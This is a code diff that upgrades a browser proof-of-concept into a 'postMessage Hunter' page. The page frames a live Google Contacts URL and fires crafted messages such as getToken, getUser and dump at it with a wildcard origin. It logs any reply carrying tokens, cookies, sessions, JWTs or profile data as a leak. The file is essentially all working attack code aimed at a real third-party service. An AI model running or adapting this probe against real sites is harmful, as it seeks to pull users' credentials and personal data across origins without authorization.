@@ -2,32 +2,92 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>postMessage Origin Leak PoC</title>
+<title>Advanced postMessage Hunter</title>
 <style>
 body { font-family: Arial; text-align:center; margin-top:50px; }
 button { padding:15px 25px; font-size:16px; }
-pre { background:#111; color:#0f0; padding:10px; text-align:left; width:80%; margin:auto; }
+pre { background:#111; color:#0f0; padding:10px; text-align:left; width:90%; margin:auto; height:300px; overflow:auto;}
 </style>
 </head>
 <body>
 
-<h2>postMessage Leak PoC</h2>
-<button id="start">Start Test</button>
+<h2>postMessage Hunter</h2>
+<button id="start">Start Scan</button>
 
 <pre id="log">Waiting...</pre>
 
 <script>
-const log = (msg) => {
-    document.getElementById("log").innerText += "\n" + msg;
-};
+const TARGET = "https://contacts.google.com/other";
 
-// 🎯 target iframe (contoh: app/webview yang rentan)
-const TARGET = "https://contacts.google.com/other"; // ganti target
+const log = (msg) => {
+    const el = document.getElementById("log");
+    el.innerText += "\n" + msg;
+    el.scrollTop = el.scrollHeight;
+};
 
 let iframe;
 
+// 🔥 Smart message analyzer
+function analyzeMessage(e) {
+    const data = e.data;
+
+    // skip noise
+    if (!data || typeof data !== "object") return;
+
+    const suspiciousKeys = [
+        "token", "auth", "cookie", "session",
+        "jwt", "email", "user", "profile"
+    ];
+
+    const found = suspiciousKeys.filter(k => JSON.stringify(data).toLowerCase().includes(k));
+
+    if (found.length > 0) {
+        log("🔥 POSSIBLE SENSITIVE DATA FOUND");
+        log("Keys: " + found.join(", "));
+        document.body.style.background = "darkred";
+    }
+}
+
+// listener global
+window.addEventListener("message", (e) => {
+    log("\n[MSG]");
+    log("Origin: " + e.origin);
+
+    try {
+        log("Data: " + JSON.stringify(e.data).slice(0, 500));
+    } catch {}
+
+    // 🚨 cross origin detection
+    if (e.origin !== location.origin) {
+        log("🚨 CROSS-ORIGIN MESSAGE");
+    }
+
+    analyzeMessage(e);
+});
+
+// fuzz sender
+function sendFuzzMessages() {
+    const payloads = [
+        {cmd: "getUser"},
+        {type: "auth"},
+        {action: "dump"},
+        {method: "getToken"},
+        {request: "profile"},
+        {debug: true}
+    ];
+
+    payloads.forEach((p, i) => {
+        setTimeout(() => {
+            try {
+                iframe.contentWindow.postMessage(p, "*");
+                log("[>] Sent payload: " + JSON.stringify(p));
+            } catch(e) {}
+        }, i * 500);
+    });
+}
+
 document.getElementById("start").onclick = () => {
-    log("[*] Creating iframe...");
+    log("[*] Loading target...");
 
     iframe = document.createElement("iframe");
     iframe.src = TARGET;
@@ -38,34 +98,10 @@ document.getElementById("start").onclick = () => {
     document.body.appendChild(iframe);
 
     setTimeout(() => {
-        log("[*] Sending crafted message...");
-
-        iframe.contentWindow.postMessage({
-            cmd: "GET_USER_DATA",
-            origin: "trusted"
-        }, "*");
-
-    }, 2000);
+        log("[*] Starting fuzz...");
+        sendFuzzMessages();
+    }, 3000);
 };
-
-// 🔥 Listener untuk data leak
-window.addEventListener("message", (e) => {
-    log("[+] Message received");
-
-    try {
-        log("Origin: " + e.origin);
-        log("Data: " + JSON.stringify(e.data, null, 2));
-
-        // 👉 bukti leak
-        if (e.data && (e.data.token || e.data.user)) {
-            document.body.style.background = "red";
-            log("🔥 POTENTIAL DATA LEAK DETECTED");
-        }
-
-    } catch(err) {
-        log("Error parsing message");
-    }
-});
 </script>
 
 </body>
